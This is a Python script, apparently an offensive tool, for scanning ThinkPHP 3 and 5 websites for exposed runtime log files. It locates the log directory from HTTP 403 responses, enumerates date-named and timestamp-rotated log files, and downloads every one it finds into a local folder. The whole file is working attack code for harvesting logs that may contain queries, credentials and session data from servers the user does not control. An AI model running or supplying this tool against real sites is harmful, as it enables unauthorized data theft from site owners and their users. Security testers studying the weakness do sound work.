# coding:utf-8
import requests
import os
import datetime
import time
import argparse
import sys
import re

def genFileName(version, year, month, day):
    now_month = datetime.datetime.now().month
    now_day = datetime.datetime.now().day
    filename_list = []
    
    for i in range(month,now_month+1):
        for j in range(day,32):
            if j > now_day:
                break
            if version == 3:
                filename_list.append("{:0>2d}_{:0>2d}_{:0>2d}.log".format(int(str(year)[2:]), i, j))
            elif version == 5:
                filename_list.append("{}{:0>2d}/{:0>2d}.log".format(year, i, j))
    return filename_list

def sendReq(url):
    try:
        html = ''
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code == 200:
            print('\033[1;31m[*]\033[0m {} | \033[1;34m{}\033[0m'.format(url, response.status_code))
            html = response.content.decode('utf-8')
        else:
            print('[-] {} | \033[1;34m{}\033[0m'.format(url, response.status_code))
    except Exception as e:
        print('[-] {} | request error'.format(url))
    finally:
        return html

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Thinkphp 3 or 5 log file scan! ")
    parser.add_argument('-u', '--url', help='target url')
    parser.add_argument('-v', '--version', type=int,
                        choices=[3, 5], default=3, help="thinkphp version, default 3")
    parser.add_argument('-y', '--year', type=int, default=datetime.datetime.now().year, help="datetime year, default {}".format(datetime.datetime.now().year))
    parser.add_argument('-m', '--month', type=int, default=1, help="datetime month, default 1")
    parser.add_argument('-d', '--day', type=int, default=1, help="datetime day, default 1")

    args = parser.parse_args()
    if not args.url:
        parser.print_help()
        sys.exit(0)

    version = args.version
    url = args.url
    year = args.year
    month = args.month
    day = args.day

    log_path_list = {
        3: ['/Runtime/Logs/','/App/Runtime/Logs/','/Application/Runtime/Logs/','/Application/Runtime/Logs/Admin/'],
        5: '/runtime/log/',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'
    }

    log_path = ''
    if version == 3:
        for path in log_path_list[version]:
            if requests.get(url+path, headers=headers).status_code == 403:
                print('\033[1;31m[*]\033[0m Found {} log path: {}'.format(url, path))
                log_path = path
                break
    elif version == 5:
        if requests.get(url+log_path_list[version], headers=headers).status_code == 403:
            print('\033[1;31m[*]\033[0m Found {} log path: {}'.format(url, log_path_list[version]))
            log_path = log_path_list[version]
    else:
        parser.print_help()
        sys.exit(0)

    if not log_path:
        print("[-] {} can't get log file! ".format(url))
        sys.exit(0)

    filename_list = genFileName(version, year, month, day)

    dir_name = url.replace('https://', '').replace('https://', '').replace('/', '')
    data_path = 'TPLogData'
    if not os.path.isdir(data_path):
        os.mkdir(data_path)
    dir_path = os.path.join(data_path, dir_name)
    if not os.path.isdir(dir_path):
        os.mkdir(dir_path)

    for filename in filename_list:
        try:
            html = sendReq(url+log_path+filename)
            if not html:
                continue
            with open(os.path.join(dir_path, filename.replace('/', '_')), 'w', encoding='utf-8') as f:
                f.write(html)

            tmp_filename = filename
            pattern = re.compile(r"\[ (\d{4}-\d{2}-\d{2})T((\d{2}:){2}\d{2})\+08:00 \]")
            while True:
                match_result = pattern.match(html)
                if not match_result:
                    break
                time_str = match_result.group(1) + ' ' + match_result.group(2)
                timeArray = time.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                timestamp = str(int(time.mktime(timeArray)))
                if version == 3:
                    tmp_filename = timestamp + '-' + filename
                else:
                    tmp_filename = filename[:filename.find('/')] + '/' + timestamp + '-' + filename[filename.find('/')+1:]
                html = sendReq(url+log_path+tmp_filename)
                if not html:
                    break
                with open(os.path.join(dir_path, tmp_filename.replace('/', '_')), 'w', encoding='utf-8') as f:
                    f.write(html)                

        except Exception as e:
            print("[-] error: {}".format(e))
